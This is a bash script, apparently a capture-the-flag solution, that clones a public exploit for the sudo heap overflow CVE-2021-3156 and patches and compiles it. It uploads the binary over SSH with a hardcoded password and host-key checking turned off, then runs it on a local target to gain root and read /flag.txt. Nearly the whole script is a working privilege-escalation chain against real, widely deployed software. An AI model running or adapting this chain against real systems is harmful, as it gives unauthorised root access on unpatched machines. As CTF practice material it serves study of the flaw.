#!/usr/bin/env bash

git clone https://github.com/stong/CVE-2021-3156
cd CVE-2021-3156
git apply ../patch
docker run -it --rm -e PASSWORD=ctf -v "$PWD:/mnt" lord-saturday sh -c 'apt -y update; apt -y install gcc; cd /mnt; gcc exploit.c'

export SSHPASS=passw0rd
base64 a.out | sshpass -e ssh  -o "StrictHostKeyChecking=no" ctf@localhost -p 9999 'base64 -d > e'
sshpass -e ssh  -o "StrictHostKeyChecking=no" ctf@localhost -p 9999 chmod +x e
# directly get te flag because SSH rejects "root" login :)
sshpass -e ssh  -o "StrictHostKeyChecking=no" ctf@localhost -p 9999 './e; su ctf -c "cat /flag.txt"'
cd ..
rm -rf CVE-2021-3156
